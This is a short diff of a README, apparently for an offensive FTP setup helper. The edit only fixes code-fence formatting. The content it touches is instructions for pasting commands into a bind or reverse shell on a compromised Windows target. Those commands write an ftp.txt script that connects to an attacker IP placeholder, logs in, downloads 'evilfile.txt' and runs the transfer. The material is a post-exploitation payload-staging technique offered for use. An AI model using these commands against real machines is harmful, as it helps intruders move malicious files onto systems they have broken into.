@@ -25,13 +25,14 @@ Change user permissions, run file and set password on request
 `./setup-ftp`
 
 Copy and paste the following code into your Windows target bind/reverse shell
-```echo open *ATTACKINGIP* 21> ftp.txt
+```
+echo open *ATTACKINGIP* 21> ftp.txt
 echo user bedford>> ftp.txt
 echo *PASSWORD*>> ftp.txt
 echo bin>> ftp.txt
 echo GET evilfile.txt>> ftp.txt
-echo bye>> ftp.txt```
-
+echo bye>> ftp.txt
+```
 Now in your Windows bind/reverse shell run the ftp.txt file
 `ftp -v -n -s:ftp.txt`
 
